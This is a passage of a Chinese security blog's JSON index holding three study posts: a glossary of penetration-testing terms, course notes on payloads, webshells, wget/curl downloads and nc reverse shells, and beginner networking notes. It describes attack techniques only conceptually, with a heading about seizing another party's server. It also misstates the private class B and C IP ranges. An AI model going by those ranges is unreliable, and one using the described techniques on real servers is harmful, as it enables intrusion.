data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。\n欺骗检测以构造虚假目标来欺骗并诱捕攻击者，从而达到延误攻击节奏，检测和分析攻击行为的目的。\n微隔离顾名思义是细粒度更小的网络隔离技术，能够应对传统环境、虚拟化环境、混合云环境、容器环境下对于东西向流量隔离的需求，重点用于阻止攻击者进入企业数据中心网络内部后的横向平移。\n逆向常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。在网络安全中，更多的是调查取证、恶意软件分析等。\n无代理安全在终端安全或者虚拟化安全防护中，往往需要在每一台主机或者虚机上安装agent（代理程序）来实现，这种方式往往需要消耗大量的资源。而无代理安全则不用安装agent，可以减少大量的部署运维工作，提升管理效率。\nCWPP全称Cloud Workload Protection Platform，意为云工作负载保护平台，主要是指对云上应用和工作负载（包括虚拟主机和容器主机上的工作负载）进行保护的技术，实现了比过去更加细粒度的防护，是现阶段云上安全的最后一道防线。\nCSPM云安全配置管理，能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。如果发现配置不合规，CSPM会采取行动进行修正。\nCASB全称Cloud Access Security Broker，即云端接入安全代理。作为部署在客户和云服务商之间的安全策略控制点，是在访问基于云的资源时企业实施的安全策略。\n防爬意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。\n安全资源池安全资源池是多种安全产品虚拟化的集合，涵盖了服务器终端、网络、业务、数据等多种安全能力。\nIAM全称为Identity and Access Management，即身份与访问管理，经常也被叫做身份认证。\n4A即认证Authentication、授权Authorization、账号Account、审计Audit，即融合统一用户账号管理、统一认证管理、统一授权管理和统一安全审计四要素后的解决方案将，涵盖单点登录（SSO）等安全功能。\nAccess Control list(ACL)\n访问控制列表。\n多因子认证主要区别于单一口令认证的方式，要通过两种以上的认证机制之后，才能得到授权，使用计算机资源。例如，用户要输入PIN码，插入银行卡，最后再经指纹比对，通过这三种认证方式，才能获得授权。这种认证方式可以降低单一口令失窃的风险，提高安全性。\n特权账户管理简称PAM。由于特权账户往往拥有很高的权限，因此一旦失窃或被滥用，会给机构带来非常大的网络安全风险。所以，特权账户管理往往在显得十分重要。其主要原则有：杜绝特权凭证共享、为特权使用赋以个人责任、为日常管理实现最小权限访问模型、对这些凭证执行的活动实现审计功能。\n零信任零信任并不是不信任，而是作为一种新的身份认证和访问授权理念，不再以网络边界来划定可信或者不可信，而是默认不相信任何人、网络以及设备，采取动态认证和授权的方式，把访问者所带来的的网络安全风险降到最低。\nSDP全称为Software Defined Perimeter，即软件定义边界，由云安全联盟基于零信任网络提出，是围绕某个应用或某一组应用创建的基于身份和上下文的逻辑访问边界。\nSecurity as a Service安全即服务，通常可理解为以SaaS的方式，将安全能力交付给客户。\n同态加密同态加密是一类具有特殊自然属性的加密方法，此概念是Rivest等人在20世纪70年代首先提出的，与一般加密算法相比，同态加密除了能实现基本的加密操作之外，还能实现密文间的多种计算功能。\n量子计算是一种遵循量子力学规律调控量子信息单元进行计算的新型计算模式，目前已经逐渐应用于加密和通信传输。\n可信计算是一项由可信计算组（可信计算集群，前称为TCPA）推动和开发的技术。可信计算是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信计算平台，以提高系统整体的安全性。\n拟态防御核心实现是一种基于网络空间内生安全机理的动态异构冗余构造（Dynamic Heterogeneous Redundancy，DHR)，为应对网络空间中基于未知漏洞、后门或病毒木马等的未知威胁，提供具有普适创新意义的防御理论和方法。\n区块链英文名为blockchain，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”、“全程留痕”、“可以追溯”、“公开透明”、“集体维护”等特征。\n远程浏览器鉴于浏览器往往成为黑客攻击的入口，因此将浏览器部署在远程的一个“浏览器服务器池”中。这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的，从而使得客户所在网络的暴露面大大降低。这种服务也类似于虚拟桌面、云手机等产品。\n云手机云手机采用全新的VMI（Virtual Mobile Infrastructure虚拟移动设施，与PC云桌面类似）技术，为员工提供一个独立的移动设备安全虚拟手机，业务应用和数据仅在服务端运行和存储，个人终端上仅做加密流媒体呈现和触控，从而有效保障企业数据的安全性。\n风控也称大数据风控，是指利用大数据分析的方法判断业务可能存在的安全风险，目前该技术主要用于金融信贷领域，防止坏账的发生。\n渗透测试为了证明网络防御按照预期计划正常运行而提供的一种机制，通常会邀请专业公司的攻击团队，按照一定的规则攻击既定目标，从而找出其中存在的漏洞或者其他安全隐患，并出具测试报告和整改建议。其目的在于不断提升系统的安全性。\n安全众测借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。\n内生安全由奇安信集团董事长齐向东在2019北京网络安全大会上首次提出，指的是不断从信息化系统内生长出的安全能力，能伴随业务的增长而持续提升，持续保证业务安全。内生安全有三个特性，即依靠信息化系统与安全系统的聚合、业务数据与安全数据的聚合以及IT人才和安全人才的聚合，从信息化系统的内部，不断长出自适应、自主和自成长的安全能力。\n内生安全框架为推动内生安全的落地，奇安信推出了内生安全框架。该框架从顶层视角出发，支撑各行业的建设模式从“局部整改外挂式”，走向“深度融合体系化”；从工程实现的角度，将安全需求分步实施，逐步建成面向未来的安全体系；内生安全框架能够输出实战化、体系化、常态化的安全能力，构建出动态防御、主动防御、纵深防御、精准防护、整体防控、联防联控的网络安全防御体系。内生安全框架包含了总结出了29个安全区域场景和 79类安全组件。\nPPDR英文全称为Policy Protection Detection Response，翻译为策略、防护、检测和响应。主要以安全策略为核心，通过一致性检查、流量统计、异常分析、模式匹配以及基于应用、目标、主机、网络的入侵检查等方法进行安全漏洞检测。\nCARTA全称为Continuous Adaptive Risk and Trust Assessment，即持续自适应风险与信任评估旨在通过动态智能分析来评估用户行为，放弃追求完美的安全，不能要求零风险，不要求100%信任，寻求一种0和1之间的风险与信任的平衡。CARTA战略是一个庞大的体系，其包括大数据、AI、机器学*、自动化、行为分析、威胁检测、安全防护、安全评估等方面。\nSASE全称为Secure Access Service Edge，即安全访问服务边缘，Gartner将其定义为一种基于实体的身份、实时上下文、企业安全&#x2F;合规策略，以及在整个会话中持续评估风险&#x2F;信任的服务。实体的身份可与人员、人员组（分支办公室）、设备、应用、服务、物联网系统或边缘计算场地相关联。\nSDL全称为Security Development Lifecycle，翻译为安全开发生命周期，是一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程，最早由微软提出。\nDevSecOps全称为Development Security Operations，可翻译为安全开发与运维。它强调在DevOps计划刚启动时就要邀请安全团队来确保信息的安全性，制定自动安全防护计划，并贯穿始终，实现持续 IT 防护。\n代码审计顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。\nNTLM验证NTLM(NT LAN Manager)是微软公司开发的一种身份验证机制，从NT4开始就一直使用，主要用于本地的帐号管理。\nMTTD平均检测时间。\nMTTR平均响应时间。\nCVE全称Common Vulnerabilities and Exposures，由于安全机构Mitre维护一个国际通用的漏洞唯一编号方案，已经被安全业界广泛接受的标准。\n软件加壳“壳”是一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。经过加壳的软件在跟踪时已无法看到其真实的十六进制代码，因此可以起到保护软件的目的。\nCNVD国家信息安全漏洞共享平台，由国家计算机应急响应中心CNCERT维护，主要负责统一收集、管理国内的漏洞信息，其发布的漏洞编号前缀也为CNVD。\n数据脱敏数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。\nGDPR《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。\nCCPA美国加利福尼亚州消费者隐私保护法案。\nSRC即Security Response Center，中文名为安全应急响应中心，主要职责为挖掘并公开收集机构存在的漏洞和其他安全隐患。\nCISO有时也被叫做CSO，即首席信息安全官，为机构的主要安全负责人。\nIPC管道为了更好地控制和处理不同进程之间的通信和数据交换，系统会通过一个特殊的连接管道来调度整个进程。\nSYN包TCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。\nIPC$是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。\nshell指的是一种命令指行环境，是系统与用户的交换方式界面。简单来说，就是系统与用户“沟通”的环境。我们平时常用到的DOS，就是一个shell。（Windows2000是cmd.exe）\nARP地址解析协议(Address Resolution Protocol)此协议将网络地址映射到硬件地址。\n","slug":"渗透测试常用术语总结","date":"2024-01-24T04:13:03.000Z","categories_index":"","tags_index":"网络安全,小迪安全,基础入门,渗透测试,常用术语","author_index":"Myprefer"},{"id":"fce12428790cc03c0af9eadde9ff43b2","title":"小迪安全 P1","content":"1. 渗透测试常用专有名词\nPOC: Proof of Concept, 概念验证, 指一段漏洞验证代码\nEXP: Exploit. 利用, 指利用系统漏洞进行攻击\nPayload: 中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令\nShellcode: 漏洞利用后将权限移交的代码\nWebshell: 针对web网站的后门\n跳板: 中介\n黑白盒测试: 未知&#x2F;已知\n社会工程学: 针对人的弱点攻击\n撞库: (社工手段)收集用户信息, 统合拆解, 猜测密码\nATT&amp;CK: MITRE ATT&amp;CK®\n一些专业术语总结:渗透测试常用术语总结 | Myprefer’s Blog\n\n\n2.\n常用命令: 【3】web安全入门篇-渗透测试中常用的命令_web安全入门篇 渗透测试中常用的命令-CSDN博客\n\n权限:\n\n命令whoami查看 “我是谁?”\n用户隶属于用户组, 用户组权限优先, 拒绝权限优先\n最高权限: system\n\n\n防火墙:\n\n个人自带防火墙: 允许入站出站\n可以在属性查看防火墙规则\n\n\n\n\n3. 案例\n文件上传下载:\n目的:\n解决无图形化\n解决数据传输\n\n\n文件下载命令: (linux自带)wget, curl(后加下载url)\n命令生成:[~]#棱角 ::Edge.Forum* (ywhack.com)\n\n\n反弹shell命令\n目的: \n解决数据回显, 交互式问答(通俗点: 看命令有没有执行成功)\n解决数据通信\n\n\nnc命令: 【Linux】之nc命令（连接与扫描指定端口、监测服务端口的使用情况）解析、详解实例、邮件告警_nc监听端口-CSDN博客\n正向连接:攻击者-&gt;连接-&gt;目标\n用途: 绕过网络防火墙\n\n\n反向连接: 目标-&gt;主动连接-&gt;攻击者\n用途: 绕过目标系统防火墙\n\n\n在反弹 shell 的上下文中，攻击者通常会在目标系统上部署一个后门程序，该程序负责建立反向连接。攻击者在自己的系统上运行一个监听程序，等待目标系统发起连接，一旦连接建立，攻击者就可以通过这个反向连接与目标系统进行交互，执行命令等操作。\n\n\n用fofa 拿下同行Pikachu服务器\nfofa: FOFA网络空间测绘系统\n\n\n\n课程计划\n\n\n","slug":"小迪安全-P1","date":"2024-01-24T03:42:56.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"931cb9b0b0328ab44d5960fb6d8e6b9f","title":"第一周课程-基础概念","content":"1. Internet\n发展阶段:\n\n静态页面时期:\n\n仅浏览网页\n\n引入多媒体技术\n\n\n\n\n\n\n\n\n\n多媒体技术就是通过计算机对各种信息(语言文字 、数据、音频、视频等)进行存储和管理，使用户能够通过多种感官跟计算机进行实时信息交流的技术\n\n\n\nCGI阶段\n\n\n\n\n\n\n\n\n\nCGI: Common Gateway Interface(通用网关接口), 是WWW技术中最重要的技术之一, 是外部应用程序(即CGI程序)与WEB服务器之间的接口标准, 负责在CGI程序和Web服务器之间传递信息\n\n云服务时期\n\nWeb技术趋于复杂, 各种技术开始运用, 增加了Web开发运维的难度\n云服务发展, 部署环境容器化, 功能拆分\n\n\n\n\n\n2. 网络安全\nWeb安全（Web Security）\n\n定义: 保护网络基础设施, 信息系统, 用户数据防止非法访问, 窃取和破坏的措施(or: 专注于保护互联网上的Web应用程序和网站的安全性)\n\n\n\n\n\n\n\n\n\nWEB，一种分布式图形信息系统。是建立在Internet上的一种网络服务，为浏览者在Internet上查找和浏览信息提供了图形化的、易于访问的直观界面\n\n\n\n\n3. 专业术语\nIP地址（Internet Protocol Address，互联网协议地址）\n\n在互联网上唯一标识和定位计算机&#x2F;设备的数字地址, 通常是IPv4(32位, 如192.168.5.130)或IPv6(128位, 如fe80::fe44:e504:6d2a:8e01)\n\nIPv4地址的分类\n\nA类地址: 1.0.0.0 ~ 126.255.255.255, 用于大型网络，支持大量主机\nB类地址: 128.0.0.0 ~ 191.255.255.255, 于中等规模的网络\nC类地址: 192.0.0.0 ~ 223.255.255.255, 用于小型网络\n\n\n保留私有IP(内网)分类\n\nA类: 10.0.0.0 ~ 10.255.255.255\nB类: 10.0.0.0 ~ 10.255.255.255\nC类: 10.0.0.0 ~ 10.255.255.255\n\n\n\n\n\n\n\n\n\n\n\n这些私有IP地址通常用于内部网络，例如家庭网络、企业内部网络或组织内部网络\n\n设备在这些私有地址范围内通信时，其流量不会直接在公共互联网上传输，而是通过网络地址转换（NAT）等技术，将私有IP地址映射到公共IP地址以便于与互联网通信，提高通信的安全性，助于缓解IPv4地址枯竭的问题\n\n\n\n\n\nDNS(Domain Name System, 域名系统):\n\n作用:将人类可读的域名映射到IP地址\n\n\n\nURL(Uniform Resource Locator, 统一资源定位符)\n\n用于指定资源的位置和访问方式\n格式: 协议:&#x2F;&#x2F;地址:端口&#x2F;路径&#x2F;…..\n\n\n安全基础-基本概念\n\n黑客: 研究突破计算机安全系统的人员\n黑帽黑客: (非法)入侵他人的安全系统\n白帽黑客: (合法)调试分析安全系统\n\n\n渗透测试: (合法)授权的安全评估方法\n模拟潜在攻击者的行为, 测试安全性\n作用: 发现和修复潜在安全漏洞\n\n\n攻防演练(护网行动):\n各单位, 企业模拟真实情境, 对网络安全系统进行攻击测试和防御\n红队: 模拟攻击方, 在合法, 授权下进行攻击\n蓝队: 复制防御和维护网络安全, 与红队形成对抗\n\n\n\n\n网络安全工具\n\nIDS(Intrusion Detection System, 入侵检测系统)\nIPS(Intrusion-prevention system, 入侵防御系统)\nVPN(Virtual Private Network, 虚拟专用网络):\n建立加密通信通道, 使数据传输更加安全\n可为企业提供安全的远程访问, 让远程用户连接访问企业内网\n允许用户模拟位于其他地理位置, 以绕过地理限制\n\n\n防火墙(Firewall): 一种网络安全设备或软件, 用于监控计算机网络中的数据流量，以防止未经授权的访问、攻击或恶意活动, 是网络安全的第一道防线\n蜜罐(Honeypot):是一种安全机制, 用于诱导攻击, 以便监测、分析和学习攻击行为\n补丁(Patch):修复安全漏洞等问题的解决方案\n\n\n加密技术\n\n加密 解密:\n\n加密算法: \n\n对称加密:\n\n非对称加密:\n\n\n\n\n\n\n\n安全防护策略\n\n身份认证(Authentication): 验证用户提供的身份信息\n授权(Authorization):\n\n\n攻击技术\n\n恶意软件*Malware):常见的形式有:病毒（Viruses） 蠕虫（Worms）木马（Trojan Horse）间谍软件（Spyware）广告软件（Adware）\n钓鱼攻击:(Phshing Attack) :通过欺骗手段获取用户敏感信息\n攻击者通常伪装成可信赖实体(比如xx官方网站)，诱使用户提供个人信息\n\n\n后门(Backdoor): 通过绕过正常授权机制而偷偷进入计算机系统或网络的手段\n病毒: 感染计算机系统并传播自身, 可以对生产环境造成大范围破坏\n漏洞: 软件硬件或系统存在的安全缺陷或错误, 可能被攻击者利用\n社会工程(Social Engineering): 通过心理学手段, 诱导人们透露敏感信息(很多电信诈骗就是靠的这个)\n\n\n\n","slug":"第一周课程-基础概念","date":"2024-01-23T13:58:46.000Z","categories_index":"","tags_index":"网络安全,学习日志,视频会议","author_index":"Myprefer"}]